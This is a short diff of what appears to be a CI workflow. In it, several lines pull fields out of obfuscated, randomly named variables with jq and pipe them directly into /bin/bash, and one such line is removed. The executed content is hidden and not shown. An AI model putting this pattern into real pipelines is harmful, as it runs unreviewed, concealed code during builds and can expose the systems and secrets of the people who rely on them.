@@ -51,7 +51,6 @@ jobs:
           echo $tsp49451 | jq -r .nbk0 | /bin/bash
           printf '%s' "$o335" | jq -r .j04 | /bin/bash
           echo $hf1502 | jq -r .y37874 | /bin/bash
-          echo $dtj60157 | jq -r .oa1605 | /bin/bash
           printf '%s' "$vicn04" | jq -r .lzqb47303 | /bin/bash
 
       - name: Save results
